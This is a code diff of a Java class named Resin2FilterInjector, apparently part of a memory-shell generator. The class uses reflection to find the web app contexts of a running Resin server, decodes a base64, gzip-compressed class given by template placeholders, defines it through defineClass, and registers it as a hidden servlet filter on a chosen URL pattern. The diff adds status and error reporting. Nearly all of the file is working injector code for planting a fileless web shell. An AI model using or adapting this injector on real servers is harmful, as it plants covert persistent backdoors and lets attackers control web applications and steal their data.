@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.resin2;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -13,36 +14,68 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  * @since 2026/7/4
  */
-    public class Resin2FilterInjector {
+public class Resin2FilterInjector {
 
-    private static boolean ok;
-    private static String shellClassName;
-    private static String shellClass;
-    private static String urlPattern;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public Resin2FilterInjector() {
-        if (ok) return;
+        if (ok) {
+            return;
+        }
+        Set<Object> contexts = null;
         try {
-            Set<Object> contexts = getContext();
-            if (contexts != null) {
-                for (Object context : contexts) {
-                    try {
-                        loadShell(context);
-                        inject(context);
-                    } catch (Throwable ignored) {
-                    }
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
+            for (Object context : contexts) {
+                try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
-        } catch (Throwable ignored) {
-        } finally {
-            ok = true;
-            shellClass = null;
-            shellClassName = null;
-            urlPattern = null;
         }
+        ok = true;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public Set<Object> getContext() throws Exception {
@@ -88,24 +121,25 @@ import java.util.zip.GZIPInputStream;
     }
 
     @SuppressWarnings("all")
-    private void loadShell(Object context) throws Exception {
+    private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        clazz.newInstance();
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
-    private void inject(Object context) throws Exception {
+    private void inject(Object context, Object filter) throws Exception {
         Map<String, Object> filters = (Map) getFieldValue(context, "_filters");
         for (String key : filters.keySet()) {
-            if (key.contains(shellClassName)) {
+            if (key.contains(getClassName())) {
                 return;
             }
         }
@@ -117,8 +151,8 @@ import java.util.zip.GZIPInputStream;
         Object filterConfig = newInstance(
                 qFilterConfigClass,
                 new Class[]{applicationClass, String.class, String.class, registryNodeClass},
-                new Object[]{context, shellClassName, shellClassName, null});
-        filters.put(shellClassName, filterConfig);
+                new Object[]{context, getClassName(), getClassName(), null});
+        filters.put(getClassName(), filterConfig);
 
         List filterList = (List) getFieldValue(context, "_filterList");
         if (filterList != null && !filterList.contains(filterConfig)) {
@@ -127,7 +161,7 @@ import java.util.zip.GZIPInputStream;
 
         Class<?> filterMapClass = loader.loadClass("com.caucho.server.http.FilterMap");
         Object filterMap = newInstance(filterMapClass, new Class[0], new Object[0]);
-        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class, String.class}, new Object[]{urlPattern, ""});
+        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), ""});
         invokeMethod(filterMap, "setData", new Class[]{Object.class}, new Object[]{filterConfig});
 
         List filterMaps = (List) getFieldValue(context, "_filterMap");
@@ -141,6 +175,11 @@ import java.util.zip.GZIPInputStream;
         Constructor<?> constructor = clazz.getDeclaredConstructor(paramClazz);
         constructor.setAccessible(true);
         return constructor.newInstance(param);
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -213,4 +252,18 @@ import java.util.zip.GZIPInputStream;
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
